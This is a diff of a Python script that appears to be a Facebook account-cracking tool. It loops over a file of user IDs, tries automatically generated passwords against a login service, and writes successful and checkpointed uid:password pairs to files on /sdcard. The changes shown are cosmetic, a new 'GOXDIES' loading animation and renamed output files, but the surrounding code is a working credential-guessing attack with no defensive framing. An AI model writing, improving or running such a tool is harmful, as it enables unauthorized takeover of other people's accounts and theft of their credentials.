@@ -21,16 +21,15 @@ light_green = "\033[1;32m"
 os.system('clear')
 
 gxdsanmtn1 = "|/-\\"
-
 gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
-
 gxdsanmtn3 = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
+gxdsanmtn4 = ["G", "O", "X", "D", "I", "E", "S"]
 
 gxdsprnt=str(f"{white}"*37)
-for gxdsloading in range(20):
+for gxdsloading in range(28):
     time.sleep(0.3)
-    sys.stdout.write("\r     LOADING: " + gxdsanmtn3[gxdsloading %
-    len(gxdsanmtn3)])
+    sys.stdout.write("\r     LOADING: " + gxdsanmtn4[gxdsloading %
+    len(gxdsanmtn4)])
     sys.stdout.flush()
 lxgo=f"""{light_gray}
 
@@ -93,7 +92,7 @@ def gxdsforward(id_file):
     print("  \033[38;5;46m========================================")
     print("\033[1;97m  [•] TOTAL ID IN FILE:\033[1;33m "+tl)
     print("\033[1;97m  [•] PASSWORD LIST:\033[1;33m AUTOMATIC ")
-    print("\033[1;97m  [•] FILE SAVE IN:\033[1;33m /sdcard/goxdies.txt\n")
+    print("\033[1;97m  [•] FILE SAVE IN:\033[1;33m /sdcard/gxds.txt\n")
     print("  \033[38;5;46m========================================")
         
     print(gxdsprnt)
@@ -240,12 +239,12 @@ def file_subb(uid,pwx):
             q=json.loads(p)
             if "session_key" in q:
                 print(f"\r\r\033[0;36m  [OK] {uid} : {ps}")
-                open("/sdcard/goxdies.txt","a+").write("[OK]" +uid+" : "+ps+"\n")
+                open("/sdcard/gxds-ok.txt","a+").write("[OK]" +uid+" : "+ps+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in q:
                 print(f"\r\r\033[94m  [CE] {uid} : {ps}\n")
-                open("/sdcard/goxdies.txt","a+").write("[CE]" +uid+" : "+ps+"\n")
+                open("/sdcard/gxds-ce.txt","a+").write("[CE]" +uid+" : "+ps+"\n")
                 oks.append(uid)
             elif "www.facebook.com" in q:
                 print(f"\r\r\033[1;91m  [CP] {uid} : {ps}")
